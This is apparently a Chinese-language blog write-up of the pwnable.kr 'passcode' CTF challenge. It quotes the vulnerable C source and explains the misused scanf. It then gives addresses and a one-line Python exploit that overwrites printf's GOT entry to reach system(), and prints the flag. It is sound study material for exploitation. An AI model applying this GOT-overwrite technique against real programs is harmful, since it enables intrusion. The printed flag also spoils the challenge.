---
layout: post
title: "pwnable.kr passcode"
date: 2018-07-10 
tag: pwn Writeup pwnable.kr
---

用`ssh passcode@pwnable.kr -p2222 (pw:guest)`连上后看见有源码，代码如下：

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

我们可以很明显的看见 login() 函数中 scanf() 写错了。`scp -P 2222 passcode@pwnable.kr:passcode /images/posts/pwnable.kr_passcode/` 把二进制文件down下来看了看发现 passcode1 就是 name[] 的最后4个字节。因此我们有了一次向任意地址写入4 bytes的机会。

![img_1](/images/posts/pwnable.kr_passcode/img_1.png)
![img_2](/images/posts/pwnable.kr_passcode/img_2.png)

用 checksec 查看一下保护。

![img_3](/images/posts/pwnable.kr_passcode/img_3.jpg)

现在我的想法是通过修改GOT表来控制EIP，GOT表的相关知识可以看看我写的[GOT与PLT](https://demonsin.github.io/2018/06/GOT%E4%B8%8EPLT/)。

我们将目标代码 `system("/bin/cat flag");` 的地址覆盖掉GOT表中 printf() 的地址。这样接下来调用 printf() 时就会跳到目标代码去了。

用 `readelf -r passcode` 看见 printf() 在 GOT表中的地址为 0x0804a000。在 IDA 中看到目标地址为 0x080485E3，即十进制的 134514147。

![img_4](/images/posts/pwnable.kr_passcode/img_4.jpg)
![img_5](/images/posts/pwnable.kr_passcode/img_5.png)

exp: `python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | /images/posts/pwnable.kr_passcode/passcode`

![img_6](/images/posts/pwnable.kr_passcode/img_6.png)

flag: Sorry mom.. I got confused about scanf usage :(